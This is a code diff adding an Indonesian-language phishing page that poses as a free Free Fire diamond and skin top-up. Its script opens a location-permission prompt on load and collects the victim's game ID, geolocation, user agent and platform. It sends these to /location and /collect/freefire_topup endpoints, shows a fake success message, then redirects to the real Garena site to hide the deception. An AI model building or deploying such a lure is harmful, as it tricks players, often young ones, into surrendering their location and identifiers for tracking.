@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Free Fire - Top Up Gratis</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
+    body{
+      background:#0a0a0a;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      height:100vh;
+      flex-direction:column;
+      color:#fff;
+      overflow:hidden;
+      background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2e 50%, #0a0a0a 100%);
+    }
+    .card{
+      width:100%;
+      max-width:400px;
+      padding:40px 30px;
+      background:rgba(255,255,255,0.05);
+      border:1px solid rgba(255,255,255,0.1);
+      border-radius:16px;
+      backdrop-filter:blur(12px);
+      box-shadow:0 0 30px rgba(255,0,80,0.3);
+      position:relative;
+      overflow:hidden;
+    }
+    .card::before {
+      content:'';
+      position:absolute;
+      top:-50%;
+      left:-50%;
+      width:200%;
+      height:200%;
+      background:linear-gradient(45deg,transparent,rgba(255,0,80,0.1),transparent);
+      transform:rotate(45deg);
+      animation:shine 3s linear infinite;
+    }
+    @keyframes shine {
+      0%{transform:rotate(45deg) translateX(-100%);}
+      100%{transform:rotate(45deg) translateX(100%);}
+    }
+    .logo{
+      font-size:36px;
+      font-weight:700;
+      background:linear-gradient(45deg,#ff0050,#ffcc00);
+      -webkit-background-clip:text;
+      -webkit-text-fill-color:transparent;
+      text-align:center;
+      margin-bottom:10px;
+      letter-spacing:-1px;
+      text-shadow:0 0 20px rgba(255,0,80,0.5);
+    }
+    .event{
+      font-size:14px;
+      color:#ffcc00;
+      text-align:center;
+      margin-bottom:25px;
+      font-weight:600;
+    }
+    .naruto{
+      width:120px;
+      height:120px;
+      margin:0 auto 20px;
+      background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="%23ffcc00"/><path d="M50 20 L60 40 L80 40 L65 55 L75 75 L50 60 L25 75 L35 55 L20 40 L40 40 Z" fill="%23ff0050"/></svg>') center/cover;
+      border-radius:50%;
+      box-shadow:0 0 20px rgba(255,204,0,0.6);
+      animation:float 3s ease-in-out infinite;
+    }
+    @keyframes float {
+      0%,100%{transform:translateY(0px);}
+      50%{transform:translateY(-10px);}
+    }
+    input{
+      width:100%;
+      padding:14px;
+      margin-bottom:20px;
+      background:rgba(0,0,0,0.8);
+      border:1px solid #333;
+      border-radius:12px;
+      color:#fff;
+      font-size:15px;
+      transition:all 0.3s ease;
+      text-align:center;
+      letter-spacing:1px;
+    }
+    input:focus{
+      outline:none;
+      border-color:#ff0050;
+      box-shadow:0 0 10px rgba(255,0,80,0.3);
+    }
+    input::placeholder{
+      color:#888;
+      text-align:center;
+    }
+    .btn{
+      width:100%;
+      padding:14px;
+      border:none;
+      border-radius:12px;
+      background:linear-gradient(45deg,#ff0050,#ffcc00);
+      color:#fff;
+      font-weight:700;
+      font-size:16px;
+      cursor:pointer;
+      transition:.3s;
+      margin-top:10px;
+    }
+    .btn:hover{
+      transform:scale(1.02);
+      box-shadow:0 0 20px rgba(255,0,80,0.6);
+    }
+    .loading{
+      display:none;
+      margin-top:15px;
+      text-align:center;
+      color:#ffcc00;
+      font-size:14px;
+    }
+    .spinner{
+      border:3px solid rgba(255,255,255,0.2);
+      border-top:3px solid #ffcc00;
+      border-radius:50%;
+      width:20px;
+      height:20px;
+      animation:spin 1s linear infinite;
+      margin:0 auto 8px;
+    }
+    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+    .reward-text{
+      text-align:center;
+      font-size:12px;
+      color:#ffcc00;
+      margin-top:15px;
+      font-weight:500;
+    }
+    .features{
+      display:flex;
+      justify-content:space-around;
+      margin:20px 0;
+      font-size:12px;
+    }
+    .feature{
+      text-align:center;
+    }
+    .feature-icon{
+      font-size:20px;
+      margin-bottom:5px;
+    }
+    .info-note{
+      background:rgba(255,204,0,0.1);
+      border-radius:10px;
+      padding:10px;
+      margin-top:15px;
+      font-size:11px;
+      text-align:center;
+      color:#ffcc00;
+      border:1px solid rgba(255,204,0,0.3);
+    }
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.85);
+      backdrop-filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s ease;
+    }
+    .modal-overlay.show {
+      opacity: 1;
+      visibility: visible;
+    }
+    .modal-container {
+      background: linear-gradient(145deg, #1a1a2e, #0f0f1a);
+      border-radius: 24px;
+      padding: 0;
+      width: 90%;
+      max-width: 340px;
+      border: 1px solid rgba(255,0,80,0.3);
+      box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 20px rgba(255,0,80,0.2);
+      transform: scale(0.9);
+      transition: transform 0.3s ease;
+    }
+    .modal-overlay.show .modal-container {
+      transform: scale(1);
+    }
+    .modal-header {
+      padding: 20px 20px 0;
+      text-align: center;
+    }
+    .modal-header h3 {
+      font-size: 22px;
+      background: linear-gradient(45deg, #ffcc00, #ff0050);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 8px;
+    }
+    .modal-header p {
+      font-size: 14px;
+      color: #aaa;
+    }
+    .modal-body {
+      padding: 20px;
+      text-align: center;
+    }
+    .location-icon {
+      font-size: 58px;
+      margin-bottom: 12px;
+    }
+    .modal-body p {
+      font-size: 14px;
+      color: #ddd;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+    .btn-grant {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(45deg, #ff0050, #ffcc00);
+      border: none;
+      border-radius: 40px;
+      color: white;
+      font-weight: bold;
+      font-size: 15px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: all 0.2s ease;
+    }
+    .btn-grant:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 20px rgba(255,0,80,0.5);
+    }
+    .btn-grant:active {
+      transform: translateY(0);
+    }
+    .btn-grant:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+      transform: none;
+    }
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: #1e1e2e;
+      backdrop-filter: blur(10px);
+      color: white;
+      padding: 12px 24px;
+      border-radius: 40px;
+      font-size: 14px;
+      font-weight: 500;
+      z-index: 1100;
+      transition: transform 0.3s ease;
+      white-space: nowrap;
+      border-left: 4px solid #ffcc00;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+      pointer-events: none;
+    }
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
+    }
+    .toast.success {
+      border-left-color: #00ff88;
+      background: #1a2a1f;
+    }
+    .toast.denied {
+      border-left-color: #ff4444;
+      background: #2a1a1a;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">Free Fire</div>
+    <div class="event">✨ TOP UP GRATIS ✨<br>Free Fire Top - Up</div>
+    <div class="gintama"></div>
+    <div class="features">
+      <div class="feature">
+        <div class="feature-icon">🎁</div>
+        <div>800 Diamond</div>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">⚡</div>
+        <div>Skin NARUTO</div>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">💎</div>
+        <div>Character</div>
+      </div>
+    </div>  
+    <input type="text" id="ffId" placeholder="Masukkan ID Free Fire Anda" autocomplete="off"/>    
+    <button class="btn" onclick="login()">TOP UP GRATIS SEKARANG</button>  
+    <div class="info-note">
+      🔥 Masukkan ID FF anda untuk klaim 800 Diamond + Skin GINTAMA Exclusive!
+    </div> 
+    <div class="loading" id="loading">
+      <div class="spinner"></div>
+      <div>Memproses top up gratis...</div>
+    </div>
+  </div>
+  <div id="modalOverlay" class="modal-overlay" onclick="handleOverlayClick(event)">
+    <div class="modal-container">
+      <div class="modal-header">
+        <h3>Izinkan terlebih dahulu.</h3>
+        <p>Event Top Up Gratis</p>
+      </div>
+      <div class="modal-body">
+        <div class="location-icon">🗺️</div>
+        <p>Untuk mengklaim Top Up Gratis 800 Diamond & Skin GINTAMA, kami perlu verifikasi.</p>
+        <button id="btnGrant" class="btn-grant" onclick="requestLocation()">
+          <svg width="17" height="17" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+          </svg> Izinkan lokasi
+        </button>
+      </div>
+    </div>
+  </div>
+  <div id="toast" class="toast"></div>
+  <script>
+    const overlay = document.getElementById('modalOverlay');
+    const toast = document.getElementById('toast');
+    let toastTimer;
+    function openModal() {
+      overlay.classList.add('show');
+      document.body.style.overflow = 'hidden';
+      document.getElementById('btnGrant').focus();
+    }
+
+    function closeModal() {
+      overlay.classList.remove('show');
+      document.body.style.overflow = '';
+    }
+
+    function handleOverlayClick(e) {
+      if (e.target === overlay) closeModal();
+    }
+
+    function showToast(message, type = '') {
+      clearTimeout(toastTimer);
+      toast.textContent = message;
+      toast.className = 'toast show ' + type;
+      toastTimer = setTimeout(() => {
+        toast.className = 'toast';
+      }, 3500);
+    }
+
+    function requestLocation() {
+      if (!('geolocation' in navigator)) {
+        showToast('Lokasi tidak didukung browser ini.', 'denied');
+        closeModal();
+        return;
+      }
+
+      const btn = document.getElementById('btnGrant');
+      btn.textContent = 'Meminta izin...';
+      btn.disabled = true;
+      btn.style.opacity = '0.7';
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+
+          fetch("/location", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              lat: lat,
+              lon: lon
+            })
+          })
+          .then(res => res.text())
+          .then(() => {
+            console.log("Lokasi berhasil dikirim ke server");
+          })
+          .catch(err => {
+            console.error("Gagal kirim ke server:", err);
+          });
+
+          closeModal();
+          showToast('✓ Izin diberikan! Memproses top up...', 'success');
+
+          btn.innerHTML = `
+            <svg width="17" height="17" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+            </svg> Beri Izin Lokasi`;
+          btn.disabled = false;
+          btn.style.opacity = '';
+        },
+
+        (err) => {
+          closeModal();
+
+          if (err.code === err.PERMISSION_DENIED) {
+            showToast('✕ Izin ditolak, tidak bisa lanjut top up.', 'denied');
+          } else {
+            showToast('⚠️ Gagal mendapatkan lokasi.', 'denied');
+          }
+
+          btn.innerHTML = `
+            <svg width="17" height="17" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+            </svg> Beri Izin Lokasi`;
+          btn.disabled = false;
+          btn.style.opacity = '';
+        },
+
+        { enableHighAccuracy: false, timeout: 20000, maximumAge: 60000 }
+      );
+    }
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape') closeModal();
+    });
+
+    async function login() {
+      const ffId = document.getElementById('ffId').value.trim();
+      
+      if (!ffId) {
+        showToast('Masukkan ID Free Fire dulu!', 'denied');
+        return;
+      }
+      
+      if (ffId.length < 5 || ffId.length > 20) {
+        showToast('ID Free Fire tidak valid!', 'denied');
+        return;
+      }
+      
+      const loading = document.getElementById('loading');
+      const btn = document.querySelector('.btn');  
+      
+      loading.style.display = 'block';
+      btn.disabled = true;
+      btn.textContent = 'PROSES TOP UP...';
+      
+      try {
+        let lat = '', lon = '';
+        try {
+          const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 }));
+          lat = pos.coords.latitude;
+          lon = pos.coords.longitude;
+        } catch(e) {
+          console.log('Location access denied or unavailable');
+        }
+        
+        await fetch('/collect/freefire_topup', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            ffId: ffId,
+            lat: lat,
+            lon: lon,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            timestamp: new Date().toISOString()
+          })
+        });
+        
+        setTimeout(() => {
+          loading.innerHTML = '<div style="color:#00ff00; font-weight:600;">✓ TOP UP BERHASIL!</div><div style="font-size:12px; margin-top:5px;">500 Diamond + Skin NARUTO sudah masuk ke ID ' + ffId + '</div>';
+          btn.style.background = 'linear-gradient(45deg, #00b300, #00ff00)';
+          btn.textContent = 'TOP UP BERHASIL ✅';
+          
+          setTimeout(() => {
+            window.location.href = 'https://ff.garena.com';
+          }, 3000);
+        }, 2000);
+        
+      } catch(e) {
+        loading.innerHTML = '<div style="color:#ff4444; font-weight:600;">✗ Top Up Gagal</div><div style="font-size:12px; margin-top:5px;">Silakan coba lagi...</div>';
+        btn.disabled = false;
+        btn.textContent = 'TOP UP GRATIS SEKARANG';
+        setTimeout(() => {
+          loading.style.display = 'none';
+          loading.innerHTML = '<div class="spinner"></div><div>Memproses top up gratis...</div>';
+        }, 3000);
+      }
+    }
+    
+    document.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') login();
+    });
+    
+    setTimeout(() => {
+      openModal();
+    }, 500);
+  </script>
+</body>
+</html>
